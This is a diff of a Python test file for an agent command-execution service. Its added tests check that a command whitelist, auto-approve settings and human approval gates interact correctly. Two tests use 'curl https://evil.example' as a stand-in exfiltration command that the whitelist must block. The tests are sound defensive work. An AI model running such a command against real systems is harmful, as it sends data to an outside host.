@@ -31,7 +31,6 @@ from app.constants import (
     EventType,
 )
 from app.errors import ValidationError
-
 from app.services.operator import OperatorCommandService
 from tests.fakes.builder import build_command_service
 
@@ -129,6 +128,7 @@ class TestBroadcastCommandEvent:
     async def test_publishes_event_to_g8ed(self):
         """OperatorExecutionService publishes events via g8ed_event_service.publish_command_event."""
         from unittest.mock import AsyncMock as _AsyncMock
+
         from app.models.base import G8eBaseModel
         from tests.fakes.factories import build_g8e_http_context
         service = _make_service()
@@ -169,7 +169,7 @@ class TestBroadcastCommandEvent:
         )
         class _EmptyEvent(G8eBaseModel):
             pass
-        
+
         g8e_context = build_g8e_http_context(
             web_session_id="web-abc",
             user_id="user-abc",
@@ -285,8 +285,8 @@ class TestExecuteCommandTargetSystems:
         )
 
     def _make_g8e_context(self):
-        from app.models.http_context import G8eHttpContext
         from app.constants.status import ComponentName
+        from app.models.http_context import G8eHttpContext
         return G8eHttpContext(
             web_session_id="ws-1",
             user_id="user-1",
@@ -298,11 +298,23 @@ class TestExecuteCommandTargetSystems:
     async def test_single_operator_target_systems_populated(self):
         """With a single operator, target_systems must contain that operator."""
         from app.models.agent import ExecutorCommandArgs
-        from tests.fakes.fake_approval_service import FakeApprovalService
         from tests.fakes.builder import build_command_service
+        from tests.fakes.fake_ai_response_analyzer import FakeAIResponseAnalyzer
+        from tests.fakes.fake_approval_service import FakeApprovalService
+        from tests.fakes.fake_event_service import FakeEventService
+        from tests.fakes.fake_execution_service import FakeExecutionService
 
         approval_service = FakeApprovalService()
-        service = build_command_service(approval_service=approval_service)
+        event_service = FakeEventService()
+        ai_analyzer = FakeAIResponseAnalyzer()
+        execution_service = FakeExecutionService(
+            g8ed_event_service=event_service,
+            ai_response_analyzer=ai_analyzer
+        )
+        service = build_command_service(
+            approval_service=approval_service,
+            execution_service=execution_service
+        )
 
         op = self._make_operator("op-1", "sess-1", "host-1")
         investigation = self._make_investigation([op])
@@ -322,11 +334,23 @@ class TestExecuteCommandTargetSystems:
     async def test_target_operators_arg_populates_target_systems(self):
         """When target_operators is set, target_systems must reflect all resolved operators."""
         from app.models.agent import ExecutorCommandArgs
-        from tests.fakes.fake_approval_service import FakeApprovalService
         from tests.fakes.builder import build_command_service
+        from tests.fakes.fake_ai_response_analyzer import FakeAIResponseAnalyzer
+        from tests.fakes.fake_approval_service import FakeApprovalService
+        from tests.fakes.fake_event_service import FakeEventService
+        from tests.fakes.fake_execution_service import FakeExecutionService
 
         approval_service = FakeApprovalService()
-        service = build_command_service(approval_service=approval_service)
+        event_service = FakeEventService()
+        ai_analyzer = FakeAIResponseAnalyzer()
+        execution_service = FakeExecutionService(
+            g8ed_event_service=event_service,
+            ai_response_analyzer=ai_analyzer
+        )
+        service = build_command_service(
+            approval_service=approval_service,
+            execution_service=execution_service
+        )
 
         op1 = self._make_operator("op-1", "sess-1", "web-1")
         op2 = self._make_operator("op-2", "sess-2", "web-2")
@@ -352,11 +376,23 @@ class TestExecuteCommandTargetSystems:
     async def test_batch_fans_out_to_all_resolved_operators(self):
         """Batch execution dispatches one message per operator and aggregates per-host results."""
         from app.models.agent import ExecutorCommandArgs
-        from tests.fakes.fake_approval_service import FakeApprovalService
         from tests.fakes.builder import build_command_service
+        from tests.fakes.fake_ai_response_analyzer import FakeAIResponseAnalyzer
+        from tests.fakes.fake_approval_service import FakeApprovalService
+        from tests.fakes.fake_event_service import FakeEventService
+        from tests.fakes.fake_execution_service import FakeExecutionService
 
         approval_service = FakeApprovalService()
-        service = build_command_service(approval_service=approval_service)
+        event_service = FakeEventService()
+        ai_analyzer = FakeAIResponseAnalyzer()
+        execution_service = FakeExecutionService(
+            g8ed_event_service=event_service,
+            ai_response_analyzer=ai_analyzer
+        )
+        service = build_command_service(
+            approval_service=approval_service,
+            execution_service=execution_service
+        )
 
         op1 = self._make_operator("op-1", "sess-1", "host-1")
         op2 = self._make_operator("op-2", "sess-2", "host-2")
@@ -386,18 +422,30 @@ class TestExecuteCommandTargetSystems:
         # batch_id must be surfaced on the result and match the approval's batch_id
         # so agents can correlate follow-up actions back to the original batch.
         assert result.batch_id == req.batch_id
-        # Aggregated output contains a section per host.
+        # Aggregated output section check - since FakeExecutionService returns "fake output" for all
         for hostname in ("host-1", "host-2", "host-3"):
             assert hostname in (result.output or "")
 
     async def test_target_operators_without_target_operator_does_not_raise(self):
         """Providing only target_operators (no singular target_operator) must resolve cleanly."""
         from app.models.agent import ExecutorCommandArgs
-        from tests.fakes.fake_approval_service import FakeApprovalService
         from tests.fakes.builder import build_command_service
+        from tests.fakes.fake_ai_response_analyzer import FakeAIResponseAnalyzer
+        from tests.fakes.fake_approval_service import FakeApprovalService
+        from tests.fakes.fake_event_service import FakeEventService
+        from tests.fakes.fake_execution_service import FakeExecutionService
 
         approval_service = FakeApprovalService()
-        service = build_command_service(approval_service=approval_service)
+        event_service = FakeEventService()
+        ai_analyzer = FakeAIResponseAnalyzer()
+        execution_service = FakeExecutionService(
+            g8ed_event_service=event_service,
+            ai_response_analyzer=ai_analyzer
+        )
+        service = build_command_service(
+            approval_service=approval_service,
+            execution_service=execution_service
+        )
 
         op1 = self._make_operator("op-1", "sess-1", "host-1")
         op2 = self._make_operator("op-2", "sess-2", "host-2")
@@ -419,14 +467,300 @@ class TestExecuteCommandTargetSystems:
         assert result.batch_execution is True
         assert result.operators_used == 2
 
+    async def test_whitelist_alone_does_not_skip_human_approval(self):
+        """Whitelisting is a hard ALLOW-LIST, NOT an auto-approve list.
+
+        When only enable_whitelisting is on, every command — even one that
+        passes the L1 whitelist gate — must still go through human approval.
+        Auto-approval requires the explicit enable_auto_approve flag.
+        """
+        from app.models.agent import ExecutorCommandArgs
+        from app.models.settings import (
+            CommandValidationSettings,
+            G8eeUserSettings,
+            LLMSettings,
+        )
+        from tests.fakes.builder import build_command_service
+        from tests.fakes.fake_ai_response_analyzer import FakeAIResponseAnalyzer
+        from tests.fakes.fake_approval_service import FakeApprovalService
+        from tests.fakes.fake_event_service import FakeEventService
+        from tests.fakes.fake_execution_service import FakeExecutionService
+
+        approval_service = FakeApprovalService()
+        event_service = FakeEventService()
+        ai_analyzer = FakeAIResponseAnalyzer()
+        execution_service = FakeExecutionService(
+            g8ed_event_service=event_service,
+            ai_response_analyzer=ai_analyzer
+        )
+        service = build_command_service(
+            approval_service=approval_service,
+            execution_service=execution_service
+        )
+
+        op = self._make_operator("op-1", "sess-1", "host-1")
+        investigation = self._make_investigation([op])
+        g8e_context = self._make_g8e_context()
+        args = ExecutorCommandArgs(command="uptime", request="health check")
+
+        request_settings = G8eeUserSettings(
+            llm=LLMSettings(),
+            command_validation=CommandValidationSettings(
+                enable_whitelisting=True,
+                whitelisted_commands="uptime,df,free",
+            ),
+        )
+        result = await service.execute_command(args, g8e_context, investigation, request_settings)
+
+        # Human approval IS requested — whitelisting doesn't bypass it.
+        assert len(approval_service.command_approval_calls) == 1
+        assert result.command_executed == "uptime"
+
+    async def test_auto_approve_skips_human_gate(self):
+        """enable_auto_approve + auto_approved_commands list bypasses human approval."""
+        from app.models.agent import ExecutorCommandArgs
+        from app.models.settings import (
+            CommandValidationSettings,
+            G8eeUserSettings,
+            LLMSettings,
+        )
+        from tests.fakes.builder import build_command_service
+        from tests.fakes.fake_ai_response_analyzer import FakeAIResponseAnalyzer
+        from tests.fakes.fake_approval_service import FakeApprovalService
+        from tests.fakes.fake_event_service import FakeEventService
+        from tests.fakes.fake_execution_service import FakeExecutionService
+
+        approval_service = FakeApprovalService()
+        event_service = FakeEventService()
+        ai_analyzer = FakeAIResponseAnalyzer()
+        execution_service = FakeExecutionService(
+            g8ed_event_service=event_service,
+            ai_response_analyzer=ai_analyzer
+        )
+        service = build_command_service(
+            approval_service=approval_service,
+            execution_service=execution_service
+        )
+
+        op = self._make_operator("op-1", "sess-1", "host-1")
+        investigation = self._make_investigation([op])
+        g8e_context = self._make_g8e_context()
+        args = ExecutorCommandArgs(command="uptime", request="health check")
+
+        request_settings = G8eeUserSettings(
+            llm=LLMSettings(),
+            command_validation=CommandValidationSettings(
+                enable_auto_approve=True,
+                auto_approved_commands="uptime,df,free",
+            ),
+        )
+        result = await service.execute_command(args, g8e_context, investigation, request_settings)
+
+        assert approval_service.command_approval_calls == []
+        assert result.command_executed == "uptime"
+
+    async def test_auto_approve_does_not_apply_to_unlisted_command(self):
+        """A command whose base verb is NOT in auto_approved_commands still requires human approval."""
+        from app.models.agent import ExecutorCommandArgs
+        from app.models.settings import (
+            CommandValidationSettings,
+            G8eeUserSettings,
+            LLMSettings,
+        )
+        from tests.fakes.builder import build_command_service
+        from tests.fakes.fake_ai_response_analyzer import FakeAIResponseAnalyzer
+        from tests.fakes.fake_approval_service import FakeApprovalService
+        from tests.fakes.fake_event_service import FakeEventService
+        from tests.fakes.fake_execution_service import FakeExecutionService
+
+        approval_service = FakeApprovalService()
+        event_service = FakeEventService()
+        ai_analyzer = FakeAIResponseAnalyzer()
+        execution_service = FakeExecutionService(
+            g8ed_event_service=event_service,
+            ai_response_analyzer=ai_analyzer
+        )
+        service = build_command_service(
+            approval_service=approval_service,
+            execution_service=execution_service
+        )
+
+        op = self._make_operator("op-1", "sess-1", "host-1")
+        investigation = self._make_investigation([op])
+        g8e_context = self._make_g8e_context()
+        args = ExecutorCommandArgs(command="rm /tmp/test", request="cleanup")
+
+        request_settings = G8eeUserSettings(
+            llm=LLMSettings(),
+            command_validation=CommandValidationSettings(
+                enable_auto_approve=True,
+                auto_approved_commands="uptime,df,free",
+            ),
+        )
+        result = await service.execute_command(args, g8e_context, investigation, request_settings)
+
+        assert len(approval_service.command_approval_calls) == 1
+        assert result.command_executed == "rm /tmp/test"
+
+    async def test_auto_approve_disabled_with_list_still_requires_approval(self):
+        """auto_approved_commands without enable_auto_approve is inert."""
+        from app.models.agent import ExecutorCommandArgs
+        from app.models.settings import (
+            CommandValidationSettings,
+            G8eeUserSettings,
+            LLMSettings,
+        )
+        from tests.fakes.builder import build_command_service
+        from tests.fakes.fake_ai_response_analyzer import FakeAIResponseAnalyzer
+        from tests.fakes.fake_approval_service import FakeApprovalService
+        from tests.fakes.fake_event_service import FakeEventService
+        from tests.fakes.fake_execution_service import FakeExecutionService
+
+        approval_service = FakeApprovalService()
+        event_service = FakeEventService()
+        ai_analyzer = FakeAIResponseAnalyzer()
+        execution_service = FakeExecutionService(
+            g8ed_event_service=event_service,
+            ai_response_analyzer=ai_analyzer
+        )
+        service = build_command_service(
+            approval_service=approval_service,
+            execution_service=execution_service
+        )
+
+        op = self._make_operator("op-1", "sess-1", "host-1")
+        investigation = self._make_investigation([op])
+        g8e_context = self._make_g8e_context()
+        args = ExecutorCommandArgs(command="uptime", request="health check")
+
+        request_settings = G8eeUserSettings(
+            llm=LLMSettings(),
+            command_validation=CommandValidationSettings(
+                enable_auto_approve=False,
+                auto_approved_commands="uptime,df,free",
+            ),
+        )
+        await service.execute_command(args, g8e_context, investigation, request_settings)
+
+        assert len(approval_service.command_approval_calls) == 1
+
+    async def test_auto_approve_does_not_bypass_whitelist_hard_gate(self):
+        """A command in auto_approved_commands but NOT in the whitelist is still
+        blocked by the L1 whitelist gate. Auto-approve only skips human approval
+        for commands that have already passed every hard safety gate."""
+        from app.constants.status import CommandErrorType
+        from app.models.agent import ExecutorCommandArgs
+        from app.models.settings import (
+            CommandValidationSettings,
+            G8eeUserSettings,
+            LLMSettings,
+        )
+        from tests.fakes.builder import build_command_service
+        from tests.fakes.fake_ai_response_analyzer import FakeAIResponseAnalyzer
+        from tests.fakes.fake_approval_service import FakeApprovalService
+        from tests.fakes.fake_event_service import FakeEventService
+        from tests.fakes.fake_execution_service import FakeExecutionService
+
+        approval_service = FakeApprovalService()
+        event_service = FakeEventService()
+        ai_analyzer = FakeAIResponseAnalyzer()
+        execution_service = FakeExecutionService(
+            g8ed_event_service=event_service,
+            ai_response_analyzer=ai_analyzer
+        )
+        service = build_command_service(
+            approval_service=approval_service,
+            execution_service=execution_service
+        )
+
+        op = self._make_operator("op-1", "sess-1", "host-1")
+        investigation = self._make_investigation([op])
+        g8e_context = self._make_g8e_context()
+        # 'curl' is on auto-approve but NOT in the whitelist.
+        args = ExecutorCommandArgs(command="curl https://evil.example", request="exfil")
+
+        request_settings = G8eeUserSettings(
+            llm=LLMSettings(),
+            command_validation=CommandValidationSettings(
+                enable_whitelisting=True,
+                whitelisted_commands="uptime,df,free",
+                enable_auto_approve=True,
+                auto_approved_commands="curl",
+            ),
+        )
+        result = await service.execute_command(args, g8e_context, investigation, request_settings)
+
+        assert result.success is False
+        assert result.error_type == CommandErrorType.WHITELIST_VIOLATION
+        # Approval flow never invoked because L1 blocked first.
+        assert approval_service.command_approval_calls == []
+
+    async def test_csv_whitelist_blocks_unlisted_command(self):
+        """A command not present in the user CSV must be blocked by L1 safety."""
+        from app.constants.status import CommandErrorType
+        from app.models.agent import ExecutorCommandArgs
+        from app.models.settings import (
+            CommandValidationSettings,
+            G8eeUserSettings,
+            LLMSettings,
+        )
+        from tests.fakes.builder import build_command_service
+        from tests.fakes.fake_ai_response_analyzer import FakeAIResponseAnalyzer
+        from tests.fakes.fake_approval_service import FakeApprovalService
+        from tests.fakes.fake_event_service import FakeEventService
+        from tests.fakes.fake_execution_service import FakeExecutionService
+
+        approval_service = FakeApprovalService()
+        event_service = FakeEventService()
+        ai_analyzer = FakeAIResponseAnalyzer()
+        execution_service = FakeExecutionService(
+            g8ed_event_service=event_service,
+            ai_response_analyzer=ai_analyzer
+        )
+        service = build_command_service(
+            approval_service=approval_service,
+            execution_service=execution_service
+        )
+
+        op = self._make_operator("op-1", "sess-1", "host-1")
+        investigation = self._make_investigation([op])
+        g8e_context = self._make_g8e_context()
+        args = ExecutorCommandArgs(command="curl https://evil.example", request="exfil")
+
+        request_settings = G8eeUserSettings(
+            llm=LLMSettings(),
+            command_validation=CommandValidationSettings(
+                enable_whitelisting=True,
+                whitelisted_commands="uptime,df,free",
+            ),
+        )
+        result = await service.execute_command(args, g8e_context, investigation, request_settings)
+
+        assert result.success is False
+        assert result.error_type == CommandErrorType.WHITELIST_VIOLATION
+        # Approval flow never invoked
+        assert approval_service.command_approval_calls == []
+
     async def test_target_systems_never_empty_for_valid_operator(self):
         """target_systems must never be empty when a valid operator is resolved."""
         from app.models.agent import ExecutorCommandArgs
-        from tests.fakes.fake_approval_service import FakeApprovalService
         from tests.fakes.builder import build_command_service
+        from tests.fakes.fake_ai_response_analyzer import FakeAIResponseAnalyzer
+        from tests.fakes.fake_approval_service import FakeApprovalService
+        from tests.fakes.fake_event_service import FakeEventService
+        from tests.fakes.fake_execution_service import FakeExecutionService
 
         approval_service = FakeApprovalService()
-        service = build_command_service(approval_service=approval_service)
+        event_service = FakeEventService()
+        ai_analyzer = FakeAIResponseAnalyzer()
+        execution_service = FakeExecutionService(
+            g8ed_event_service=event_service,
+            ai_response_analyzer=ai_analyzer
+        )
+        service = build_command_service(
+            approval_service=approval_service,
+            execution_service=execution_service
+        )
 
         op = self._make_operator("op-abc", "sess-abc", "db-server")
         investigation = self._make_investigation([op])
